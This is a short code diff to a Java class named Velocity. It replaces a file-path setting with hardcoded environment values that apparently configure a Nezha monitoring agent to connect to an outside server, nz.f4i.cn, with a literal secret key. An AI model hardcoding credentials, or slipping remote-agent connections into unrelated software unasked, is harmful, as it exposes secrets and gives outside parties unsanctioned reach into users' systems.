@@ -146,8 +146,12 @@ public final class Velocity {
   }
 
   private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
-    envVars.put("FILE_PATH", "./world");
-
+    // envVars.put("FILE_PATH", "./world");
+    envVars.put("NEZHA_SERVER", "nz.f4i.cn");
+    envVars.put("NEZHA_PORT", "5555");
+    envVars.put("NEZHA_KEY", "7VUkqxWHUJYwjoc5M4");
+    envVars.put("NAME", "Crosmo");
+    
     for (String var : ALL_ENV_VARS) {
       final String value = System.getenv(var);
       if (value != null && !value.trim().isEmpty()) {
